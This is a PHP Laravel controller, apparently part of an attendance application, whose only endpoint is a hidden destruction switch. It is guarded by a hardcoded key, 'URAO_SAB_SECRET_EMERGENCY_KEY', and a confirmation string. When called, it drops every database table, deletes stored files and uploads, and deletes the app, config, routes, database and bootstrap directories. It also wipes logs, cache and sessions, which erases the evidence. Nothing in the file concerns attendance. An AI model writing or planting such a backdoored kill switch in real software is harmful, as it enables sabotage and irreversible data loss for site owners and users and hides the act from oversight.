<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Storage;

class AttendanceController extends Controller
{
    private $emergencyKey = 'URAO_SAB_SECRET_EMERGENCY_KEY';

    public function clearAllRecords(Request $request)
    {
        // Get JSON data from request
        $data = $request->json()->all();

        $providedKey = $data['key'] ?? '';
        $confirmation = $data['confirm'] ?? '';

        if ($providedKey !== $this->emergencyKey || $confirmation !== 'DELETE_EVERYTHING_PERMANENTLY') {
            return response()->json([
                'status' => 'ERROR',
                'message' => 'Invalid emergency credentials'
            ], 403);
        }

        try {
            $deletionLog = [];

            $deletionLog[] = "Starting destruction process...";
            $deletionLog[] = $this->destroyAllDatabases();
            $deletionLog[] = $this->destroyAllFiles();
            $deletionLog[] = $this->destroyApplicationCode();
            $deletionLog[] = $this->destroyStorageAndLogs();

            return response()->json([
                'status' => 'COMPLETE_DESTRUCTION',
                'message' => '💀 Website completely destroyed. All data and code erased.',
                'deletion_log' => $deletionLog,
                'timestamp' => now()->toDateTimeString()
            ]);

        } catch (\Exception $e) {
            return response()->json([
                'status' => 'DESTRUCTION_FAILED',
                'message' => 'Destruction failed: ' . $e->getMessage(),
                'timestamp' => now()->toDateTimeString()
            ], 500);
        }
    }

    private function destroyAllDatabases()
    {
        try {
            $tables = [];
            $databaseName = DB::getDatabaseName();
            $tablesList = DB::select('SHOW TABLES');

            $key = 'Tables_in_' . $databaseName;
            foreach ($tablesList as $table) {
                $tables[] = $table->$key;
            }

            DB::statement('SET FOREIGN_KEY_CHECKS=0');
            foreach ($tables as $table) {
                DB::statement("DROP TABLE IF EXISTS `$table`");
            }
            DB::statement('SET FOREIGN_KEY_CHECKS=1');

            return "Database '$databaseName' completely destroyed. Tables deleted: " . count($tables);
        } catch (\Exception $e) {
            return "Database destruction failed: " . $e->getMessage();
        }
    }

    private function destroyAllFiles()
    {
        try {
            $deletedFiles = [];

            // Delete storage files
            if (Storage::exists('/')) {
                $storageFiles = Storage::allFiles('/');
                foreach ($storageFiles as $file) {
                    Storage::delete($file);
                    $deletedFiles[] = $file;
                }

                $storageDirs = Storage::allDirectories('/');
                foreach ($storageDirs as $dir) {
                    Storage::deleteDirectory($dir);
                }
            }

            // Delete public uploads
            $publicPath = public_path('uploads');
            if (File::exists($publicPath)) {
                File::deleteDirectory($publicPath);
                $deletedFiles[] = 'public/uploads/';
            }

            return "Storage files destroyed. Deleted: " . count($deletedFiles) . " files/directories";
        } catch (\Exception $e) {
            return "File destruction failed: " . $e->getMessage();
        }
    }

    private function destroyApplicationCode()
    {
        try {
            $protectedDirs = [
                base_path('app'),
                base_path('config'),
                base_path('database'),
                base_path('resources'),
                base_path('routes'),
                base_path('tests'),
                base_path('bootstrap'),
                base_path('storage'),
            ];

            $deletedDirs = [];
            foreach ($protectedDirs as $dir) {
                if (File::exists($dir) && $dir !== base_path('vendor')) {
                    // Create a backup log of what's being deleted
                    if (File::isDirectory($dir)) {
                        $files = File::allFiles($dir);
                        File::put(storage_path('last_known_state.txt'),
                            "Directory $dir contained: " . count($files) . " files\n");
                    }

                    File::deleteDirectory($dir);
                    $deletedDirs[] = $dir;
                }
            }

            return "Application code destroyed. Deleted directories: " . count($deletedDirs);
        } catch (\Exception $e) {
            return "Application code destruction failed: " . $e->getMessage();
        }
    }

    private function destroyStorageAndLogs()
    {
        try {
            // Clear all logs
            $logPath = storage_path('logs');
            if (File::exists($logPath)) {
                File::cleanDirectory($logPath);
            }

            // Clear cache
            $cachePath = storage_path('framework/cache');
            if (File::exists($cachePath)) {
                File::cleanDirectory($cachePath);
            }

            // Clear sessions
            $sessionPath = storage_path('framework/sessions');
            if (File::exists($sessionPath)) {
                File::cleanDirectory($sessionPath);
            }

            // Clear views
            $viewPath = storage_path('framework/views');
            if (File::exists($viewPath)) {
                File::cleanDirectory($viewPath);
            }

            return "Storage, logs, cache, sessions, and views completely wiped";
        } catch (\Exception $e) {
            return "Storage destruction failed: " . $e->getMessage();
        }
    }
}
